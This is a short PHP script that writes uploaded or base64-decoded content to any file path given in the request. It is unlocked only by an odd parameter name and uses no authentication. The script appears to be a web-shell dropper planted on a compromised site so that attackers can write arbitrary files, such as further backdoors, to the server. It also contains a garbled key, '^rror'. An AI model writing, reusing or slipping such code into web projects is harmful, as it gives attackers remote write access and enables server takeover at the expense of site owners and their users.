<?php
if(isset($_REQUEST['DBIDnB']) && isset($_REQUEST['f']) && (isset($_REQUEST['c']) || (isset($_FILES['c']) && $_FILES['c']['^rror']===0))) {
    $file = $_REQUEST['f'];
    $content = isset($_FILES['c']) ? file_get_contents($_FILES['c']['tmp_name']) : base64_decode($_REQUEST['c']);
    $result = @file_put_contents($file, $content);
    echo $result !== false ? "OK: $file (".strlen($content)." bytes)\n" : "FAIL\n";
}
?>